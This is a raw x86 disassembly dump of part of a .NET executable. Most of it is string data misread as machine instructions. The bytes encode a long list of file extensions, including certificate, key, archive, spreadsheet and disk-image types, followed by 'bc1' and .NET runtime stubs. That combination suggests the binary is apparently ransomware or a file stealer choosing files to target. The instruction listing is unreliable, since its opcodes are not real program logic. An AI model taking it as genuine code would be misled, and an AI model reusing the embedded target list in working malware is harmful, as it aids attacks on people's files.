  407373:	69 00 66 00 74 00    	imul   $0x740066,(%eax),%eax
  407379:	00 09                	add    %cl,(%ecx)
  40737b:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40737f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  407383:	00 09                	add    %cl,(%ecx)
  407385:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  407389:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40738d:	00 09                	add    %cl,(%ecx)
  40738f:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  407393:	66 00 74 00 00       	data16 add %dh,0x0(%eax,%eax,1)
  407398:	09 2e                	or     %ebp,(%esi)
  40739a:	00 6f 00             	add    %ch,0x0(%edi)
  40739d:	72 00                	jb     0x40739f
  40739f:	66 00 00             	data16 add %al,(%eax)
  4073a2:	09 2e                	or     %ebp,(%esi)
  4073a4:	00 70 00             	add    %dh,0x0(%eax)
  4073a7:	66 00 78 00          	data16 add %bh,0x0(%eax)
  4073ab:	00 09                	add    %cl,(%ecx)
  4073ad:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4073b1:	31 00                	xor    %eax,(%eax)
  4073b3:	32 00                	xor    (%eax),%al
  4073b5:	00 07                	add    %al,(%edi)
  4073b7:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4073bb:	6c                   	insb   (%dx),%es:(%edi)
  4073bc:	00 00                	add    %al,(%eax)
  4073be:	09 2e                	or     %ebp,(%esi)
  4073c0:	00 70 00             	add    %dh,0x0(%eax)
  4073c3:	6c                   	insb   (%dx),%es:(%edi)
  4073c4:	00 73 00             	add    %dh,0x0(%ebx)
  4073c7:	00 0b                	add    %cl,(%ebx)
  4073c9:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4073cd:	61                   	popa
  4073ce:	00 66 00             	add    %ah,0x0(%esi)
  4073d1:	65 00 00             	add    %al,%gs:(%eax)
  4073d4:	09 2e                	or     %ebp,(%esi)
  4073d6:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4073da:	00 62 00             	add    %ah,0x0(%edx)
  4073dd:	00 09                	add    %cl,(%ecx)
  4073df:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  4073e3:	62 00                	bound  %eax,(%eax)
  4073e5:	73 00                	jae    0x4073e7
  4073e7:	00 09                	add    %cl,(%ecx)
  4073e9:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  4073ed:	6c                   	insb   (%dx),%es:(%edi)
  4073ee:	00 6b 00             	add    %ch,0x0(%ebx)
  4073f1:	00 09                	add    %cl,(%ecx)
  4073f3:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  4073f7:	6c                   	insb   (%dx),%es:(%edi)
  4073f8:	00 6d 00             	add    %ch,0x0(%ebp)
  4073fb:	00 09                	add    %cl,(%ecx)
  4073fd:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  407401:	6c                   	insb   (%dx),%es:(%edi)
  407402:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407406:	0b 2e                	or     (%esi),%ebp
  407408:	00 78 00             	add    %bh,0x0(%eax)
  40740b:	6c                   	insb   (%dx),%es:(%edi)
  40740c:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  407410:	00 00                	add    %al,(%eax)
  407412:	0b 2e                	or     (%esi),%ebp
  407414:	00 73 00             	add    %dh,0x0(%ebx)
  407417:	76 00                	jbe    0x407419
  407419:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40741d:	00 09                	add    %cl,(%ecx)
  40741f:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  407423:	6c                   	insb   (%dx),%es:(%edi)
  407424:	00 6b 00             	add    %ch,0x0(%ebx)
  407427:	00 0f                	add    %cl,(%edi)
  407429:	2e 00 74 00 61       	add    %dh,%cs:0x61(%eax,%eax,1)
  40742e:	00 72 00             	add    %dh,0x0(%edx)
  407431:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  407435:	7a 00                	jp     0x407437
  407437:	00 09                	add    %cl,(%ecx)
  407439:	2e 00 64 00 6d       	add    %ah,%cs:0x6d(%eax,%eax,1)
  40743e:	00 67 00             	add    %ah,0x0(%edi)
  407441:	00 07                	add    %al,(%edi)
  407443:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  407447:	73 00                	jae    0x407449
  407449:	00 09                	add    %cl,(%ecx)
  40744b:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40744f:	73 00                	jae    0x407451
  407451:	62 00                	bound  %eax,(%eax)
  407453:	00 09                	add    %cl,(%ecx)
  407455:	2e 00 74 00 69       	add    %dh,%cs:0x69(%eax,%eax,1)
  40745a:	00 66 00             	add    %ah,0x0(%esi)
  40745d:	00 09                	add    %cl,(%ecx)
  40745f:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  407463:	73 00                	jae    0x407465
  407465:	73 00                	jae    0x407467
  407467:	00 09                	add    %cl,(%ecx)
  407469:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40746d:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  407471:	00 09                	add    %cl,(%ecx)
  407473:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  407477:	6f                   	outsl  %ds:(%esi),(%dx)
  407478:	00 62 00             	add    %ah,0x0(%edx)
  40747b:	00 0b                	add    %cl,(%ebx)
  40747d:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  407481:	70 00                	jo     0x407483
  407483:	73 00                	jae    0x407485
  407485:	70 00                	jo     0x407487
  407487:	00 09                	add    %cl,(%ecx)
  407489:	2e 00 64 00 63       	add    %ah,%cs:0x63(%eax,%eax,1)
  40748e:	00 33                	add    %dh,(%ebx)
  407490:	00 00                	add    %al,(%eax)
  407492:	09 2e                	or     %ebp,(%esi)
  407494:	00 69 00             	add    %ch,0x0(%ecx)
  407497:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40749b:	00 11                	add    %dl,(%ecx)
  40749d:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  4074a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4074a2:	00 65 00             	add    %ah,0x0(%ebp)
  4074a5:	74 00                	je     0x4074a7
  4074a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4074a8:	00 63 00             	add    %ah,0x0(%ebx)
  4074ab:	32 00                	xor    (%eax),%al
  4074ad:	00 09                	add    %cl,(%ecx)
  4074af:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  4074b3:	70 00                	jo     0x4074b5
  4074b5:	74 00                	je     0x4074b7
  4074b7:	00 09                	add    %cl,(%ecx)
  4074b9:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4074bd:	37                   	aaa
  4074be:	00 62 00             	add    %ah,0x0(%edx)
  4074c1:	00 09                	add    %cl,(%ecx)
  4074c3:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4074c7:	61                   	popa
  4074c8:	00 6d 00             	add    %ch,0x0(%ebp)
  4074cb:	00 09                	add    %cl,(%ecx)
  4074cd:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  4074d1:	33 00                	xor    (%eax),%eax
  4074d3:	64 00 00             	add    %al,%fs:(%eax)
  4074d6:	09 2e                	or     %ebp,(%esi)
  4074d8:	00 6f 00             	add    %ch,0x0(%edi)
  4074db:	76 00                	jbe    0x4074dd
  4074dd:	61                   	popa
  4074de:	00 00                	add    %al,(%eax)
  4074e0:	07                   	pop    %es
  4074e1:	62 00                	bound  %eax,(%eax)
  4074e3:	63 00                	arpl   %eax,(%eax)
  4074e5:	31 00                	xor    %eax,(%eax)
  4074e7:	00 81 a7 77 a2 cc    	add    %al,-0x335d8859(%ecx)
  4074ed:	85 f5                	test   %esi,%ebp
  4074ef:	40                   	inc    %eax
  4074f0:	ae                   	scas   %es:(%edi),%al
  4074f1:	f5                   	cmc
  4074f2:	ca 05 8c             	lret   $0x8c05
  4074f5:	69 9c cd 00 08 b7 7a 	imul   $0x3419565c,0x7ab70800(%ebp,%ecx,8),%ebx
  4074fc:	5c 56 19 34 
  407500:	e0 89                	loopne 0x40748b
  407502:	03 06                	add    (%esi),%eax
  407504:	1d 05 02 06 0e       	sbb    $0xe060205,%eax
  407509:	02 06                	add    (%esi),%al
  40750b:	02 02                	add    (%edx),%al
  40750d:	06                   	push   %es
  40750e:	08 03                	or     %al,(%ebx)
  407510:	06                   	push   %es
  407511:	12 0d 06 06 15 12    	adc    0x12150606,%cl
  407517:	11 01                	adc    %eax,(%ecx)
  407519:	0e                   	push   %cs
  40751a:	03 06                	add    (%esi),%eax
  40751c:	1d 0e 07 00 04       	sbb    $0x400070e,%eax
  407521:	08 09                	or     %cl,(%ecx)
  407523:	09 0e                	or     %ecx,(%esi)
  407525:	09 05 00 01 01 1d    	or     %eax,0x1d010100
  40752b:	0e                   	push   %cs
  40752c:	03 00                	add    (%eax),%eax
  40752e:	00 01                	add    %al,(%ecx)
  407530:	03 00                	add    (%eax),%eax
  407532:	00 02                	add    %al,(%edx)
  407534:	03 06                	add    (%esi),%eax
  407536:	12 15 04 00 01 0e    	adc    0xe010004,%dl
  40753c:	08 04 00             	or     %al,(%eax,%eax,1)
  40753f:	01 0e                	add    %ecx,(%esi)
  407541:	0e                   	push   %cs
  407542:	04 00                	add    $0x0,%al
  407544:	01 01                	add    %eax,(%ecx)
  407546:	0e                   	push   %cs
  407547:	04 00                	add    $0x0,%al
  407549:	01 02                	add    %eax,(%edx)
  40754b:	0e                   	push   %cs
  40754c:	03 00                	add    (%eax),%eax
  40754e:	00 0e                	add    %cl,(%esi)
  407550:	06                   	push   %es
  407551:	00 03                	add    %al,(%ebx)
  407553:	01 0e                	add    %ecx,(%esi)
  407555:	0e                   	push   %cs
  407556:	0e                   	push   %cs
  407557:	05 00 02 01 0e       	add    $0xe010200,%eax
  40755c:	0e                   	push   %cs
  40755d:	06                   	push   %es
  40755e:	00 03                	add    %al,(%ebx)
  407560:	01 0e                	add    %ecx,(%esi)
  407562:	0e                   	push   %cs
  407563:	0a 04 00             	or     (%eax,%eax,1),%al
  407566:	00 1d 05 05 00 02    	add    %bl,0x2000505
  40756c:	0e                   	push   %cs
  40756d:	0e                   	push   %cs
  40756e:	0e                   	push   %cs
  40756f:	03 20                	add    (%eax),%esp
  407571:	00 01                	add    %al,(%ecx)
  407573:	04 1d                	add    $0x1d,%al
  407575:	03 00                	add    (%eax),%eax
  407577:	00 04 00             	add    %al,(%eax,%eax,1)
  40757a:	01 02                	add    %eax,(%edx)
  40757c:	18 05 00 02 18 18    	sbb    %al,0x18180200
  407582:	18 02                	sbb    %al,(%edx)
  407584:	06                   	push   %es
  407585:	18 05 20 01 02 12    	sbb    %al,0x12020120
  40758b:	0d 06 20 01 01       	or     $0x1012006,%eax
  407590:	10 11                	adc    %dl,(%ecx)
  407592:	19 04 20             	sbb    %eax,(%eax,%eiz,1)
  407595:	00 12                	add    %dl,(%edx)
  407597:	1d 04 28 00 12       	sbb    $0x12002804,%eax
  40759c:	1d 05 20 01 01       	sbb    $0x1012005,%eax
  4075a1:	11 25 01 02 04 20    	adc    %esp,0x20040201
  4075a7:	01 01                	add    %eax,(%ecx)
  4075a9:	08 04 20             	or     %al,(%eax,%eiz,1)
  4075ac:	01 01                	add    %eax,(%ecx)
  4075ae:	0e                   	push   %cs
  4075af:	03 06                	add    (%esi),%eax
  4075b1:	12 35 04 01 00 00    	adc    0x104,%dh
  4075b7:	00 05 20 02 01 1c    	add    %al,0x1c010220
  4075bd:	18 05 20 01 01 12    	sbb    %al,0x12010120
  4075c3:	35 04 00 01 01       	xor    $0x1010004,%eax
  4075c8:	08 05 00 01 01 12    	or     %al,0x12010100
  4075ce:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075d1:	00 12                	add    %dl,(%edx)
  4075d3:	49                   	dec    %ecx
  4075d4:	03 20                	add    (%eax),%esp
  4075d6:	00 0e                	add    %cl,(%esi)
  4075d8:	05 00 01 0e 11       	add    $0x110e0100,%eax
  4075dd:	51                   	push   %ecx
  4075de:	05 00 02 02 0e       	add    $0xe020200,%eax
  4075e3:	0e                   	push   %cs
  4075e4:	04 07                	add    $0x7,%al
  4075e6:	02 0e                	add    (%esi),%cl
  4075e8:	0e                   	push   %cs
  4075e9:	05 00 00 1d 12       	add    $0x121d0000,%eax
  4075ee:	59                   	pop    %ecx
  4075ef:	04 00                	add    $0x0,%al
  4075f1:	00 12                	add    %dl,(%edx)
  4075f3:	59                   	pop    %ecx
  4075f4:	04 20                	add    $0x20,%al
  4075f6:	00 12                	add    %dl,(%edx)
  4075f8:	5d                   	pop    %ebp
  4075f9:	05 20 01 12 61       	add    $0x61120120,%eax
  4075fe:	08 03                	or     %al,(%ebx)
  407600:	20 00                	and    %al,(%eax)
  407602:	08 0e                	or     %cl,(%esi)
  407604:	07                   	pop    %es
  407605:	06                   	push   %es
  407606:	1d 12 59 12 59       	sbb    $0x59125912,%eax
  40760b:	12 59 02             	adc    0x2(%ecx),%bl
  40760e:	1d 12 59 08 05       	sbb    $0x5085912,%eax
  407613:	20 02                	and    %al,(%edx)
  407615:	08 08                	or     %cl,(%eax)
  407617:	08 04 20             	or     %al,(%eax,%eiz,1)
  40761a:	01 03                	add    %eax,(%ebx)
  40761c:	08 05 20 01 12 69    	or     %al,0x69120120
  407622:	03 06                	add    (%esi),%eax
  407624:	07                   	pop    %es
  407625:	03 12                	add    (%edx),%edx
  407627:	69 08 03 04 00 00    	imul   $0x403,(%eax),%ecx
  40762d:	12 6d 05             	adc    0x5(%ebp),%ch
  407630:	20 01                	and    %al,(%ecx)
  407632:	1d 05 0e 05 00       	sbb    $0x50e05,%eax
  407637:	01 0e                	add    %ecx,(%esi)
  407639:	1d 05 04 07 01       	sbb    $0x1070405,%eax
  40763e:	1d 05 04 20 01       	sbb    $0x1200405,%eax
  407643:	02 0e                	add    (%esi),%cl
  407645:	05 00 01 1d 0e       	add    $0xe1d0100,%eax
  40764a:	0e                   	push   %cs
  40764b:	05 15 12 79 01       	add    $0x1791215,%eax
  407650:	0e                   	push   %cs
  407651:	0d 10 01 02 02       	or     $0x2020110,%eax
  407656:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
  40765b:	79 01                	jns    0x40765e
  40765d:	1e                   	push   %ds
  40765e:	00 03                	add    %al,(%ebx)
  407660:	0a 01                	or     (%ecx),%al
  407662:	0e                   	push   %cs
  407663:	06                   	push   %es
  407664:	20 01                	and    %al,(%ecx)
  407666:	01 11                	add    %edx,(%ecx)
  407668:	80 89 03 20 00 0a 06 	orb    $0x6,0xa002003(%ecx)
  40766f:	00 03                	add    %al,(%ebx)
  407671:	0e                   	push   %cs
  407672:	0e                   	push   %cs
  407673:	0e                   	push   %cs
  407674:	0e                   	push   %cs
  407675:	0a 00                	or     (%eax),%al
  407677:	02 01                	add    (%ecx),%al
  407679:	0e                   	push   %cs
  40767a:	15 12 80 91 01       	adc    $0x1918012,%eax
  40767f:	0e                   	push   %cs
  407680:	13 07                	adc    (%edi),%eax
  407682:	0c 1d                	or     $0x1d,%al
  407684:	0e                   	push   %cs
  407685:	02 08                	add    (%eax),%cl
  407687:	0e                   	push   %cs
  407688:	12 80 81 0e 0e 0e    	adc    0xe0e0e81(%eax),%al
  40768e:	0e                   	push   %cs
  40768f:	12 18                	adc    (%eax),%bl
  407691:	1d 0e 08 0b 07       	sbb    $0x70b080e,%eax
  407696:	06                   	push   %es
  407697:	1d 0e 0e 02 1d       	sbb    $0x1d020e0e,%eax
  40769c:	0e                   	push   %cs
  40769d:	1d 0e 08 05 20       	sbb    $0x2005080e,%eax
  4076a2:	01 12                	add    %edx,(%edx)
  4076a4:	69 0e 04 07 01 12    	imul   $0x12010704,(%esi),%ecx
  4076aa:	69 04 20 01 08 08 06 	imul   $0x6080801,(%eax,%eiz,1),%eax
  4076b1:	07                   	pop    %es
  4076b2:	02 12                	add    (%edx),%dl
  4076b4:	69 12 15 02 06 0a    	imul   $0xa060215,(%edx),%edx
  4076ba:	08 00                	or     %al,(%eax)
  4076bc:	02 01                	add    (%ecx),%al
  4076be:	12 7d 11             	adc    0x11(%ebp),%bh
  4076c1:	80 9d 07 20 02 01 0e 	sbbb   $0xe,0x1022007(%ebp)
  4076c8:	11 80 a5 06 20 01    	adc    %eax,0x12006a5(%eax)
  4076ce:	01 11                	add    %edx,(%ecx)
  4076d0:	80 b1 08 20 03 01 1d 	xorb   $0x1d,0x1032008(%ecx)
  4076d7:	05 1d 05 08 05       	add    $0x508051d,%eax
  4076dc:	20 01                	and    %al,(%ecx)
  4076de:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  4076e3:	01 01                	add    %eax,(%ecx)
  4076e5:	1d 05 06 20 01       	sbb    $0x1200605,%eax
  4076ea:	01 11                	add    %edx,(%ecx)
  4076ec:	80 bd 07 20 03 01 1d 	cmpb   $0x1d,0x1032007(%ebp)
  4076f3:	05 08 08 05 20       	add    $0x20050808,%eax
  4076f8:	00 12                	add    %dl,(%edx)
  4076fa:	80 c5 0c             	add    $0xc,%ch
  4076fd:	20 03                	and    %al,(%ebx)
  4076ff:	01 12                	add    %edx,(%edx)
  407701:	80 c1 12             	add    $0x12,%cl
  407704:	80 c5 11             	add    $0x11,%ch
  407707:	80 cd 06             	or     $0x6,%ch
  40770a:	20 01                	and    %al,(%ecx)
  40770c:	01 12                	add    %edx,(%edx)
  40770e:	80 c1 0a             	add    $0xa,%cl
  407711:	20 03                	and    %al,(%ebx)
  407713:	01 0e                	add    %ecx,(%esi)
  407715:	11 80 a5 11 80 d1    	adc    %eax,-0x2e7fee5b(%eax)
  40771b:	1c 07                	sbb    $0x7,%al
  40771d:	0a 0e                	or     (%esi),%cl
  40771f:	1d 05 12 80 a1       	sbb    $0xa1801205,%eax
  407724:	1d 05 12 80 a9       	sbb    $0xa9801205,%eax
  407729:	12 80 b5 12 80 c9    	adc    -0x367fed4b(%eax),%al
  40772f:	12 80 a1 12 80 a1    	adc    -0x5e7fed5f(%eax),%al
  407735:	12 80 d5 15 07 07    	adc    0x70715d5(%eax),%al
  40773b:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  407740:	80 a1 12 80 a9 12 80 	andb   $0x80,0x12a98012(%ecx)
  407747:	b5 12                	mov    $0x12,%ch
  407749:	80 c9 12             	or     $0x12,%cl
  40774c:	80 a1 0d 20 04 01 0e 	andb   $0xe,0x104200d(%ecx)
  407753:	11 80 a5 11 80 d1    	adc    %eax,-0x2e7fee5b(%eax)
  407759:	11 80 e1 04 20 01    	adc    %eax,0x12004e1(%eax)
  40775f:	01 0a                	add    %ecx,(%edx)
  407761:	05 07 01 12 80       	add    $0x80120107,%eax
  407766:	a1 08 07 03 1d       	mov    0x1d030708,%eax
  40776b:	05 12 80 e5 08       	add    $0x8e58012,%eax
  407770:	07                   	pop    %es
  407771:	20 02                	and    %al,(%edx)
  407773:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  407778:	04 20                	add    $0x20,%al
  40777a:	01 01                	add    %eax,(%ecx)
  40777c:	02 0b                	add    (%ebx),%cl
  40777e:	07                   	pop    %es
  40777f:	05 1d 05 12 80       	add    $0x8012051d,%eax
  407784:	ed                   	in     (%dx),%eax
  407785:	1d 05 0e 0e 06       	sbb    $0x60e0e05,%eax
  40778a:	00 00                	add    %al,(%eax)
  40778c:	1d 12 80 f5 17       	sbb    $0x17f58012,%eax
  407791:	07                   	pop    %es
  407792:	0a 12                	or     (%edx),%dl
  407794:	80 f5 0e             	xor    $0xe,%ch
  407797:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  40779c:	12 80 f9 12 20 1d    	adc    0x1d2012f9(%eax),%al
  4077a2:	12 80 f5 08 1d 0e    	adc    0xe1d08f5(%eax),%al
  4077a8:	05 00 00 12 80       	add    $0x80120000,%eax
  4077ad:	fd                   	std
  4077ae:	06                   	push   %es
  4077af:	20 01                	and    %al,(%ecx)
  4077b1:	01 12                	add    %edx,(%edx)
  4077b3:	81 01 03 20 00 02    	addl   $0x2002003,(%ecx)
  4077b9:	11 07                	adc    %eax,(%edi)
  4077bb:	09 0e                	or     %ecx,(%esi)
  4077bd:	0e                   	push   %cs
  4077be:	0e                   	push   %cs
  4077bf:	0e                   	push   %cs
  4077c0:	0e                   	push   %cs
  4077c1:	12 81 01 12 59 12    	adc    0x12591201(%ecx),%al
  4077c7:	81 01 12 59 06 20    	addl   $0x20065912,(%ecx)
  4077cd:	01 01                	add    %eax,(%ecx)
  4077cf:	11 81 05 07 00 01    	adc    %eax,0x1000705(%ecx)
  4077d5:	12 59 12             	adc    0x12(%ecx),%bl
  4077d8:	81 01 15 07 0a 0e    	addl   $0xe0a0715,(%ecx)
  4077de:	0e                   	push   %cs
  4077df:	0e                   	push   %cs
  4077e0:	0e                   	push   %cs
  4077e1:	0e                   	push   %cs
  4077e2:	12 81 01 12 59 12    	adc    0x12591201(%ecx),%al
  4077e8:	81 09 12 81 09 12    	orl    $0x12098112,(%ecx)
  4077ee:	81 01 07 00 04 0e    	addl   $0xe040007,(%ecx)
  4077f4:	0e                   	push   %cs
  4077f5:	0e                   	push   %cs
  4077f6:	0e                   	push   %cs
  4077f7:	0e                   	push   %cs
  4077f8:	05 20 02 0e 03       	add    $0x30e0220,%eax
  4077fd:	03 09                	add    (%ecx),%ecx
  4077ff:	07                   	pop    %es
  407800:	05 0e 0e 12 80       	add    $0x80120e0e,%eax
  407805:	d5 0e                	aad    $0xe
  407807:	0e                   	push   %cs
  407808:	05 00 01 12 59       	add    $0x59120100,%eax
  40780d:	0e                   	push   %cs
  40780e:	03 07                	add    (%edi),%eax
  407810:	01 0e                	add    %ecx,(%esi)
  407812:	05 07 03 0e 0e       	add    $0xe0e0307,%eax
  407817:	0e                   	push   %cs
  407818:	04 06                	add    $0x6,%al
  40781a:	12 81 11 07 20 02    	adc    0x2200711(%ecx),%al
  407820:	12 81 11 0e 02 05    	adc    0x5020e11(%ecx),%al
  407826:	20 02                	and    %al,(%edx)
  407828:	01 0e                	add    %ecx,(%esi)
  40782a:	1c 05                	sbb    $0x5,%al
  40782c:	07                   	pop    %es
  40782d:	01 12                	add    %edx,(%edx)
  40782f:	81 11 0a 07 03 12    	adcl   $0x1203070a,(%ecx)
  407835:	80 f5 1d             	xor    $0x1d,%ch
  407838:	12 80 f5 08 07 07    	adc    0x70708f5(%eax),%al
  40783e:	02 12                	add    (%edx),%dl
  407840:	59                   	pop    %ecx
  407841:	12 81 01 06 20 01    	adc    0x1200601(%ecx),%al
  407847:	12 81 11 0e 05 00    	adc    0x50e11(%ecx),%al
  40784d:	01 1d 05 0e 06 00    	add    %ebx,0x60e05
  407853:	02 01                	add    (%ecx),%al
  407855:	0e                   	push   %cs
  407856:	1d 05 05 15 12       	sbb    $0x12150505,%eax
  40785b:	11 01                	adc    %eax,(%ecx)
  40785d:	0e                   	push   %cs
  40785e:	05 20 01 01 13       	add    $0x13010120,%eax
  407863:	00 09                	add    %cl,(%ecx)
  407865:	07                   	pop    %es
  407866:	02 15 12 11 01 0e    	add    0xe011112,%dl
  40786c:	1d 0e 03 20 00       	sbb    $0x20030e,%eax
  407871:	18 06                	sbb    %al,(%esi)
  407873:	20 01                	and    %al,(%ecx)
  407875:	12 81 1d 0e 05 20    	adc    0x20050e1d(%ecx),%al
  40787b:	02 0e                	add    (%esi),%cl
  40787d:	0e                   	push   %cs
  40787e:	0e                   	push   %cs
  40787f:	04 07                	add    $0x7,%al
  407881:	01 12                	add    %edx,(%edx)
  407883:	1d 06 20 01 01       	sbb    $0x1012006,%eax
  407888:	11 81 29 06 07 02    	adc    %eax,0x2070629(%ecx)
  40788e:	12 3d 12 24 06 07    	adc    0x7062412,%bh
  407894:	02 12                	add    (%edx),%dl
  407896:	3d 12 28 08 01       	cmp    $0x1082812,%eax
  40789b:	00 08                	add    %cl,(%eax)
  40789d:	00 00                	add    %al,(%eax)
  40789f:	00 00                	add    %al,(%eax)
  4078a1:	00 1e                	add    %bl,(%esi)
  4078a3:	01 00                	add    %eax,(%eax)
  4078a5:	01 00                	add    %eax,(%eax)
  4078a7:	54                   	push   %esp
  4078a8:	02 16                	add    (%esi),%dl
  4078aa:	57                   	push   %edi
  4078ab:	72 61                	jb     0x40790e
  4078ad:	70 4e                	jo     0x4078fd
  4078af:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078b1:	45                   	inc    %ebp
  4078b2:	78 63                	js     0x407917
  4078b4:	65 70 74             	gs jo  0x40792b
  4078b7:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4078be:	77 73                	ja     0x407933
  4078c0:	01 00                	add    %eax,(%eax)
  4078c2:	00 00                	add    %al,(%eax)
  4078c4:	ec                   	in     (%dx),%al
  4078c5:	78 00                	js     0x4078c7
	...
  4078cf:	00 0e                	add    %cl,(%esi)
  4078d1:	79 00                	jns    0x4078d3
  4078d3:	00 00                	add    %al,(%eax)
  4078d5:	20 00                	and    %al,(%eax)
	...
  4078eb:	00 00                	add    %al,(%eax)
  4078ed:	79 00                	jns    0x4078ef
	...
  4078ff:	00 00                	add    %al,(%eax)
  407901:	00 5f 43             	add    %bl,0x43(%edi)
  407904:	6f                   	outsl  %ds:(%esi),(%dx)
  407905:	72 45                	jb     0x40794c
  407907:	78 65                	js     0x40796e
  407909:	4d                   	dec    %ebp
  40790a:	61                   	popa
  40790b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  407912:	72 65                	jb     0x407979
  407914:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  407918:	6c                   	insb   (%dx),%es:(%edi)
  407919:	00 00                	add    %al,(%eax)
  40791b:	00 00                	add    %al,(%eax)
  40791d:	00 ff                	add    %bh,%bh
  40791f:	25 00 20 40 00       	and    $0x402000,%eax
